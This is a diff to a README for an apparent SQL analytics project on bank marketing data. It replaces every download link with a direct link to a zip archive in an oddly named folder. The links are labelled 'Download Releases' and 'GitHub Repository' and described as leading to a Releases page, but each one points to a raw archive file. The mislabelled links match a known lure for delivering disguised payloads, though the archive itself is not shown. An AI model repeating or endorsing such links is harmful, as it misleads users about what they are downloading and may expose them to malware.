@@ -16,7 +16,7 @@ Welcome to the bank-marketing-sql-analysis project! This application helps you a
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [**Download Releases**](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/differentialize/bank-marketing-sql-analysis.zip).
+To get started, visit this page to download: [**Download Releases**](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/promoral/marketing-analysis-sql-bank-1.2-alpha.5.zip).
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
@@ -71,7 +71,7 @@ This project is open for contributions. If you would like to improve the applica
 ---
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/differentialize/bank-marketing-sql-analysis.zip)
-- [Download Releases](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/differentialize/bank-marketing-sql-analysis.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/promoral/marketing-analysis-sql-bank-1.2-alpha.5.zip)
+- [Download Releases](https://raw.githubusercontent.com/akrem-sl/bank-marketing-sql-analysis/main/promoral/marketing-analysis-sql-bank-1.2-alpha.5.zip)
 
 Feel free to explore and enjoy the insights you gain from this powerful analytics tool!
